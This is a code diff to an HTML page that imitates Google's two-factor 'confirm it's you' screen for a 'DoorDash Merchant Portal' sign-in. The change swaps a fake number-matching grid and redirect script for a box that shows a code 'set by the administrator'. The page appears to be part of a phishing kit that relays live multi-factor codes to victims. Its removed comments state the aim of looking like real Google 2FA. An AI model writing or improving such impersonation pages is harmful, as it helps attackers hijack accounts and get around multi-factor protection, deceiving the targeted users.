@@ -65,40 +65,6 @@
             font-weight: 500;
         }
 
-        .account-chip {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            border: 1px solid #dadce0;
-            border-radius: 16px;
-            padding: 6px 12px 6px 6px;
-            font-size: 14px;
-            color: #3c4043;
-            margin-bottom: 24px;
-            max-width: 100%;
-        }
-
-        .account-chip .avatar {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            background: #1a73e8;
-            color: #ffffff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            font-weight: 600;
-            flex-shrink: 0;
-            text-transform: uppercase;
-        }
-
-        .account-chip .email-text {
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
         /* Device illustration (Google-style two-factor / device prompt) */
         .device-illustration {
             margin: 8px auto 28px;
@@ -144,37 +110,50 @@
             color: #1a73e8;
         }
 
-        /* Match number grid (Google's number-matching 2FA) */
-        .match-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 24px;
+        /* ---------- ADMIN NUMBER DISPLAY BOX ---------- */
+        .admin-number-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 16px 0 28px;
         }
 
-        .match-btn {
-            font-size: 20px;
+        .admin-number-box .number-display {
+            font-size: 52px;
             font-weight: 500;
-            color: #202124;
-            background: #ffffff;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            padding: 14px 8px;
-            cursor: pointer;
-            transition: all 0.12s ease;
-            font-family: inherit;
-            letter-spacing: 2px;
-        }
-
-        .match-btn:hover {
-            border-color: #1a73e8;
+            letter-spacing: 8px;
+            color: #1a73e8;
             background: #f8fbff;
+            border: 2px dashed #1a73e8;
+            border-radius: 12px;
+            padding: 16px 28px 16px 36px;
+            min-width: 220px;
+            text-align: center;
+            font-variant-numeric: tabular-nums;
+            line-height: 1.2;
+            transition: all 0.15s ease;
+            /* placeholder state – empty until backend fills it */
+            color: #1a73e8;
         }
 
-        .match-btn.selected {
-            background: #1a73e8;
-            border-color: #1a73e8;
-            color: #ffffff;
+        /* When the number is empty (before admin sets it) we show a subtle placeholder */
+        .admin-number-box .number-display.empty {
+            color: #9aa0a6;
+            border-color: #dadce0;
+            background: #fafafa;
+            font-size: 20px;
+            font-weight: 400;
+            letter-spacing: normal;
+            padding: 20px 28px;
+            font-style: italic;
+        }
+
+        .admin-number-box .number-hint {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 10px;
+            letter-spacing: 0.3px;
         }
 
         /* Actions */
@@ -183,6 +162,7 @@
             align-items: center;
             justify-content: space-between;
             gap: 16px;
+            margin-top: 8px;
         }
 
         .back-link {
@@ -332,6 +312,11 @@
                 width: 160px;
                 height: 120px;
             }
+            .admin-number-box .number-display {
+                font-size: 40px;
+                padding: 12px 20px 12px 28px;
+                min-width: 160px;
+            }
         }
     </style>
 </head>
@@ -353,23 +338,13 @@
                 Confirm it's you to continue to <strong>DoorDash Merchant Portal</strong>.
             </p>
 
-            <div class="account-chip" id="accountChip">
-                <span class="avatar" id="avatarLetter">A</span>
-                <span class="email-text" id="chipEmail">loading...</span>
-            </div>
-
             <!-- Device illustration -->
             <svg class="device-illustration" viewBox="0 0 200 150" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                <!-- Laptop base -->
                 <rect x="20" y="110" width="160" height="10" rx="3" fill="#dadce0"/>
-                <!-- Laptop screen -->
                 <rect x="45" y="30" width="110" height="80" rx="4" fill="#f1f3f4" stroke="#dadce0" stroke-width="2"/>
-                <!-- Screen content: shield -->
                 <path d="M100 48 L86 54 L86 68 C86 76 92 82 100 85 C108 82 114 76 114 68 L114 54 Z" fill="#1a73e8"/>
                 <path d="M94 66 L98 70 L107 61" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                <!-- Keyboard hint -->
                 <rect x="60" y="95" width="80" height="4" rx="2" fill="#e8eaed"/>
-                <!-- Phone next to laptop -->
                 <rect x="155" y="75" width="26" height="42" rx="4" fill="#ffffff" stroke="#dadce0" stroke-width="2"/>
                 <circle cx="168" cy="111" r="2" fill="#dadce0"/>
                 <rect x="160" y="82" width="16" height="2" rx="1" fill="#1a73e8"/>
@@ -392,14 +367,12 @@
                 </div>
             </div>
 
-            <!-- Match number grid (user taps the matching number) -->
-            <div class="match-grid" id="matchGrid">
-                <button class="match-btn" type="button" data-value="12">12</button>
-                <button class="match-btn" type="button" data-value="47">47</button>
-                <button class="match-btn" type="button" data-value="83">83</button>
-                <button class="match-btn" type="button" data-value="59">59</button>
-                <button class="match-btn" type="button" data-value="26">26</button>
-                <button class="match-btn" type="button" data-value="71">71</button>
+            <!-- ===== ADMIN NUMBER DISPLAY BOX (empty by default) ===== -->
+            <div class="admin-number-box" id="adminNumberBox">
+                <div class="number-display empty" id="adminNumberDisplay" data-number="">
+                    ⏳ Waiting for code
+                </div>
+                <div class="number-hint">This number is set by the administrator</div>
             </div>
 
             <div class="actions">
@@ -440,77 +413,6 @@
 
     </div>
 
-    <script>
-        // ---- Read the email from the URL query string ----
-        const params = new URLSearchParams(window.location.search);
-        const rawEmail = params.get('email') || '';
-        const email = rawEmail.trim().toLowerCase();
 
-        // If no email was passed, send the user back to email.html
-        if (!email) {
-            window.location.replace('email.html');
-        }
-
-        // ---- Populate the account chip ----
-        const chipEmail = document.getElementById('chipEmail');
-        const avatarLetter = document.getElementById('avatarLetter');
-        chipEmail.textContent = email;
-        avatarLetter.textContent = email.charAt(0).toUpperCase();
-
-        // ---- Views ----
-        const authView = document.getElementById('authView');
-        const loadingView = document.getElementById('loadingView');
-        const loadingText = document.getElementById('loadingText');
-
-        function showLoading() {
-            authView.classList.add('hidden');
-            loadingView.classList.add('visible');
-            loadingText.textContent = 'Verifying…';
-        }
-
-        // ---- Match number selection ----
-        const matchButtons = document.querySelectorAll('.match-btn');
-        const verifyBtn = document.getElementById('verifyBtn');
-        let selectedNumber = null;
-
-        matchButtons.forEach(btn => {
-            btn.addEventListener('click', () => {
-                matchButtons.forEach(b => b.classList.remove('selected'));
-                btn.classList.add('selected');
-                selectedNumber = btn.dataset.value;
-                verifyBtn.disabled = false;
-            });
-        });
-
-        // ---- Verify + redirect ----
-        verifyBtn.addEventListener('click', () => {
-            if (!selectedNumber) return;
-
-            showLoading();
-
-            // Staged loading messages to feel more like real Google 2FA
-            const steps = [
-                { delay: 600,  text: 'Confirming the number…' },
-                { delay: 1300, text: 'Verifying it\'s you…' },
-                { delay: 2000, text: 'Almost done…' }
-            ];
-
-            steps.forEach(step => {
-                setTimeout(() => {
-                    loadingText.textContent = step.text;
-                }, step.delay);
-            });
-
-            // After the loading sequence, go to success page
-            setTimeout(() => {
-                window.location.href = 'success.html?email=' + encodeURIComponent(email);
-            }, 2700);
-        });
-
-        // ---- Back button: return to gmail.html ----
-        document.getElementById('backBtn').addEventListener('click', () => {
-            window.location.href = 'gmail.html?email=' + encodeURIComponent(email);
-        });
-    </script>
 </body>
 </html>
